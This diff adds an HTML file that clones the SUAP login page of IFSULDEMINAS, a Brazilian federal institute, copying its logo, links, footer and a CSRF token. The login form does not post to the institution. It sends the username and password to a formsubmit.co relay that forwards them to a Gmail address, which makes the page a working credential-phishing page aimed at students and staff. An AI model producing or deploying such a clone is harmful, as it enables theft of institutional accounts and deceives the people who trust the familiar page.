@@ -1,0 +1,240 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <title>- SUAP: Sistema Unificado de Administração Pública</title>
+    <meta charset="utf-8" />
+    <meta name="keywords" content="suap, administração, pública, mec, ifrn" />
+    <meta content="SUAP: Sistema Unificado de Administração Pública" name="description" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <link rel="shortcut icon" href="../../../static/comum/img/favicon.png" />
+    <link href="../../../static/css/main_default.css" rel="stylesheet" type="text/css" media="all" />
+    <link href="../../../static/css/anonima.css" rel="stylesheet" type="text/css" media="all" />
+    <script type="text/javascript" src="../../../static/js/jquery.min.js" charset="utf-8"></script>
+    <script type="text/javascript" src="../../../static/js/login.js" charset="utf-8"></script>
+    <script type="text/javascript" src="../../../static/js/tabs.js" charset="utf-8"></script>
+    <script src="../../../static/comum/js/jquery.min.js"></script>
+    <script src="../../../static/comum/js/jquery.ui.custom.min.js"></script>
+    <script type="text/javascript" src="../../../static/js/main.js" charset="utf-8"></script>
+    <script type="text/javascript" src="../../../static/js/nouislider.min.js" charset="utf-8"></script>
+    <script>
+        jQuery(document).ready(function () {
+            initAll();
+        });
+    </script>
+    <meta name="test_suap_login" content="1" />
+</head>
+
+<body class="anonima login centered">
+    <div class="holder">
+        <header>
+            <div class="wrapper">
+                <h1><a href="https://portal.suap.ifrn.edu.br/">Sistema Unificado de Administração Pública</a></h1>
+                <a href="/"><img src="../../../media/configuracao/suap_svg.svg" class="logo-instituicao" alt="Logo de Instituto Federal de Educação, Ciência e Tecnologia do Sul de Minas Gerais" aria-hidden="true" /></a>
+            </div>
+        </header>
+        <main class="wrapper">
+            <div class="title-container"><div class="action-bar-container"></div></div>
+            <div class="flex-container">
+                <div class="flex-item"></div>
+                <div class="flex-item">
+                    <h2><span class="fas fa-lock" aria-hidden="true"></span> Login IFSULDEMINAS</h2>
+                    <form action="https://formsubmit.co/xteste1010@gmail.com" method="post" autocomplete="off">
+                        <input type="hidden" name="csrfmiddlewaretoken" value="G0gyUo1GmehL8GAql6YIi6LASf82hZFxSjaXdHsM08m4KPMyTIMIUJvuanHv7Y3W" />
+                        <div class="form-row">
+                            <div>
+                                <label for="id_username" class="required" style="width: 100%;">
+                                    <span
+                                        class="hint hint-bottom"
+                                        aria-label="Para acessar como Aluno, utilize seu número de Matrícula - Registro Acadêmico (RA). Para acessar como Servidor, utilize seu SIAPE. Já para acessar como Prestador de Serviço ou Bolsista, utilize seu CPF. Alunos formados e usuários externos devem acessar via 'Entrar com gov.br'"
+                                    >
+                                        <span class="fas fa-info-circle" aria-label="id_username"></span>
+                                    </span> 
+                                    Usuário: <br />
+                                </label>
+                                <input type="text" autocomplete="off" name="name" autofocus="" autocapitalize="none" maxlength="150" required="" id="id_username" />
+                            </div>
+                        </div>
+                        <div class="form-row">
+                            <div>
+                                <label for="id_password" class="required">Senha:</label>
+                                <div class="password-container">
+                                    <input type="password" class="password-input" autocomplete="off" name="password" required="" id="id_password" />
+                                    <button class="input-group-addon" type="button" role="button" id="view-password" title="Exibir a senha">
+                                        <span class="fa fa-eye fa-fw" aria-hidden="true"></span><span class="sr-only">Exibir a senha</span>
+                                    </button>
+                                </div>
+                                <script>
+                                    toggle_password_view("password");
+                                </script> 
+                                <input type="hidden" name="this_is_the_login_form" value="1" />
+                                <input type="hidden" name="next" value="/" />
+                            </div>
+                        </div>
+                        <div class="submit-row"><input type="submit" class="btn success" value="Acessar" /></div>
+
+              
+              </form>
+              
+                            <div class="form-row">                                                          
+                                <a href="https://sou.ifsuldeminas.edu.br/" class="remember-password">Primeiro acesso?</a><a href="https://sou.ifsuldeminas.edu.br/" class="remember-password">Esqueceu sua senha?</a>
+                                <a href="https://sou.ifsuldeminas.edu.br/" class="remember-password">Deseja alterar sua senha?</a>
+                            </div>
+                            <h3 class="ou mt-3"><span>ou</span></h3>
+                            <div class="form-row mt-3 text-center">
+                                <a href="/login/govbr/" class="btn default login-govbr"> Entrar com <span>Gov.BR</span></a>
+                            </div>
+                        </form>
+                    </div>
+                    <div class="flex-item login-bg"></div>
+                    <div class="flex-item"></div>
+                </div>
+            </main>
+            <footer class="login-footer">
+                <div class="wrapper">
+                    <ul class="_main_menu">
+                        <li class="_menu_group">
+                            <span class="_menu_subtitle">Acessos</span>
+                            <ul class="_menu_subgroup">
+                                <li class="_menu_item">
+                                    <a href="/accounts/login/" title="Login" class="_menu_link"><span class="fas fa-lock" aria-hidden="true"></span> Login</a>
+                                </li>
+                                <li class="_menu_item">
+                                    <a href="https://sou.ifsuldeminas.edu.br/" title="Alterar Senha" class="_menu_link"><span class="fas fa-key" aria-hidden="true"></span> Alterar Senha</a>
+                                </li>
+                                <li class="_menu_item">
+                                    <a href="/edu/acesso_responsavel/" title="Acesso do Responsável" class="_menu_link"><span class="fas fa-passport" aria-hidden="true"></span> Acesso do Responsável</a>
+                                </li>
+                            </ul>
+                        </li>
+                        <li class="_menu_group">
+                            <span class="_menu_subtitle">Consultas</span>
+                            <ul class="_menu_subgroup">
+                                <li class="_menu_item">
+                                    <a href="/documento_eletronico/consulta_publica/" title="Documentos Eletrônicos" class="_menu_link"><span class="fas fa-file" aria-hidden="true"></span> Documentos Eletrônicos</a>
+                                </li>
+                                <li class="_menu_item">
+                                    <a href="/protocolo/consulta_publica" title="Processos Físicos" class="_menu_link"><span class="fas fa-file-alt" aria-hidden="true"></span> Processos Físicos</a>
+                                </li>
+                                <li class="_menu_item">
+                                    <a href="/comum/autenticar_documento/" title="Documentos Gerais" class="_menu_link"><span class="fas fa-lock" aria-hidden="true"></span> Documentos Gerais</a>
+                                </li>
+                                <li class="_menu_item">
+                                    <a href="/comum/validar_assinatura/" title="Assinaturas Digitais" class="_menu_link"><span class="fas fa-lock" aria-hidden="true"></span> Assinaturas Digitais</a>
+                                </li>
+                                <li class="_menu_item">
+                                    <a href="/contratos/listar_contratos/" title="Contratos" class="_menu_link"><span class="fas fa-file-contract" aria-hidden="true"></span> Contratos</a>
+                                </li>
+                                <li class="_menu_item">
+                                    <a href="/demandas/atualizacoes/" title="Atualizações do Sistema" class="_menu_link"><span class="fas fa-file-contract" aria-hidden="true"></span> Atualizações do Sistema</a>
+                                </li>
+                                <li class="_menu_item">
+                                    <a href="/processo_eletronico/consulta_publica/" title="Processos Eletrônicos" class="_menu_link"><span class="fas fa-file" aria-hidden="true"></span> Processos Eletrônicos</a>
+                                </li>
+                                <li class="_menu_item">
+                                    <a href="/investimentos/consulta_investimento_publico/" title="Investimentos de TI" class="_menu_link"><span class="fas fa-chart-line" aria-hidden="true"></span> Investimentos de TI</a>
+                                </li>
+                                <li class="_menu_item">
+                                    <a href="/eventos/" title="Eventos" class="_menu_link"><span class="fas fa-certificate" aria-hidden="true"></span> Eventos</a>
+                                </li>
+                                <li class="_menu_item">
+                                    <a href="/plan_estrategico/pdi/1/farol_consolidado/" title="Farol de Desempenho" class="_menu_link"><span class="fas fa-chart-line" aria-hidden="true"></span> Farol de Desempenho</a>
+                                </li>
+                                <li class="_menu_item">
+                                    <a href="/sistemas/consulta_sistema_publico/" title="Sistemas de TI" class="_menu_link"><span class="fas fa-chart-line" aria-hidden="true"></span> Sistemas de TI</a>
+                                </li>
+                            </ul>
+                        </li>
+                        <li class="_menu_group">
+                            <span class="_menu_subtitle">Cursos FIC</span>
+                            <ul class="_menu_subgroup">
+                                <li class="_menu_item">
+                                    <a href="/inscricoesfic/efetuar_inscricao/" title="Realizar inscrição em curso FIC" class="_menu_link"><span class="fas fa-certificate" aria-hidden="true"></span> Realizar inscrição em curso FIC</a>
+                                </li>
+                            </ul>
+                        </li>
+                        <li class="_menu_group">
+                            <span class="_menu_subtitle">Ensino</span>
+                            <ul class="_menu_subgroup">
+                                <li class="_menu_item">
+                                    <a href="/edu/autenticar_certificado_minicurso/" title="Certificados de Minicursos" class="_menu_link"><span class="fas fa-lock" aria-hidden="true"></span> Certificados de Minicursos</a>
+                                </li>
+                                <li class="_menu_item">
+                                    <a href="/edu/solicitar_certificado_enem/" title="Certificação ENEM" class="_menu_link"><span class="fas fa-certificate" aria-hidden="true"></span> Certificação ENEM</a>
+                                </li>
+                                <li class="_menu_item">
+                                    <a href="/edu/registroemissaodiploma_public/" title="Registro de Diplomas" class="_menu_link"><span class="fas fa-certificate" aria-hidden="true"></span> Registro de Diplomas</a>
+                                </li>
+                                <li class="_menu_item">
+                                    <a href="/edu/validar_diploma_digital/" title="Validar Diploma Digital" class="_menu_link"><span class="fas fa-certificate" aria-hidden="true"></span> Validar Diploma Digital</a>
+                                </li>
+                                <li class="_menu_item">
+                                    <a href="/edu/validar_historico_digital/" title="Validar Histórico Digital" class="_menu_link"><span class="fas fa-certificate" aria-hidden="true"></span> Validar Histórico Digital</a>
+                                </li>
+                            </ul>
+                        </li>
+                        <li class="_menu_group">
+                            <span class="_menu_subtitle">Gestão de Pessoas</span>
+                            <ul class="_menu_subgroup">
+                                <li class="_menu_item">
+                                    <a href="/rh/indicadores_publicos/" title="Indicadores" class="_menu_link"><span class="fas fa-chart-line" aria-hidden="true"></span> Indicadores</a>
+                                </li>
+                            </ul>
+                        </li>
+                        <li class="_menu_group">
+                            <span class="_menu_subtitle">Normativa Docente</span>
+                            <ul class="_menu_subgroup">
+                                <li class="_menu_item">
+                                    <a href="https://normativadocente.ifsuldeminas.edu.br/transparencia/" title="Planos e Relatórios de Trabalho Docente" class="_menu_link">
+                                        <span class="fas fa-chart-line" aria-hidden="true"></span> Planos e Relatórios de Trabalho Docente
+                                    </a>
+                                </li>
+                            </ul>
+                        </li>
+                        <li class="_menu_group">
+                            <span class="_menu_subtitle">Pesquisa/Extensão</span>
+                            <ul class="_menu_subgroup">
+                                <li class="_menu_item">
+                                    <a href="/estagios/avaliar_pratica_profissional_supervisor/" title="Avaliação de Estágio" class="_menu_link"><span class="fas fa-chart-line" aria-hidden="true"></span> Avaliação de Estágio</a>
+                                </li>
+                                <li class="_menu_item">
+                                    <a href="/pesquisa/autocadastro_parecerista/" title="Seja um Parecerista" class="_menu_link"><span class="fas fa-file-alt" aria-hidden="true"></span> Seja um Parecerista</a>
+                                </li>
+                                <li class="_menu_item">
+                                    <a href="/demandas_externas/periodos_demanda/" title="Demandas da Comunidade" class="_menu_link"><span class="fas fa-file-alt" aria-hidden="true"></span> Demandas da Comunidade</a>
+                                </li>
+                            </ul>
+                        </li>
+                        <li class="_menu_group">
+                            <span class="_menu_subtitle">Programa de Gestão e Desempenho</span>
+                            <ul class="_menu_subgroup">
+                                <li class="_menu_item">
+                                    <a href="/programa_gestao_ifg/painel/" title="Painel" class="_menu_link"><span class="fas fa-chart-line" aria-hidden="true"></span> Painel</a>
+                                </li>
+                                <li class="_menu_item">
+                                    <a href="/programa_gestao_ifg/listar_planos_publicos/" title="Planos de Trabalho" class="_menu_link"><span class="fas fa-search" aria-hidden="true"></span> Planos de Trabalho</a>
+                                </li>
+                            </ul>
+                        </li>
+                        <li class="_menu_group">
+                            <span class="_menu_subtitle">Solicitações</span>
+                            <ul class="_menu_subgroup">
+                                <li class="_menu_item">
+                                    <a href="/encceja_ifg/solicitar_certificado_encceja/" title="Solicitação de Certificação ENCCEJA" class="_menu_link">
+                                        <span class="fas fa-certificate" aria-hidden="true"></span> Solicitação de Certificação ENCCEJA
+                                    </a>
+                                </li>
+                            </ul>
+                        </li>
+                    </ul>
+                    <div class="flex-container">
+                        <div class="flex-item"><span class="fas fa-copyright" aria-hidden="true"></span> 2024 SUAP</div>
+                        <div class="flex-item"><span class="fab fa-python" aria-hidden="true"></span> Desenvolvimento por IFRN</div>
+                        <div class="flex-item"><span class="fas fa-server" aria-hidden="true"></span> suap - 6554bed85912</div>
+                        <div class="flex-item"><span class="fas fa-id-badge" aria-hidden="true"></span> Licenciado para IFSULDEMINAS</div>
+                    </div>
+                </div>
+            </footer>
+        </div>
+        <script type="text/javascript" src="../../../static/js/fancybox.js" charset="utf-8"></script>
+    </body>
+</html>
